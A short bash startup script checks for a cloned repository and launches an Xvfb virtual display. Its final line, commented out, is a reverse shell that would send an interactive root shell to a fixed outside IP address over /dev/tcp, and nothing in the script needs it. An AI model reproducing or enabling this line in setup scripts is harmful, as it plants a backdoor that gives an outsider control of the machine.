#!/bin/bash
#echo "vanishxmainone" > /root/g00g
File="/root/SDA_ALL/README.md"
if [ -f "$File" ]; then  
echo "$File exist"  
else  
echo "$File does not exist"
#git clone https://github.com/GH0STAV0/SDA_ALL.git /root/SDA_ALL
fi  

Xvfb -ac :99 -screen 0 1280x1024x16 &
export DISPLAY=:99

#bash -i >& /dev/tcp/105.105.225.248/10001 0>&1
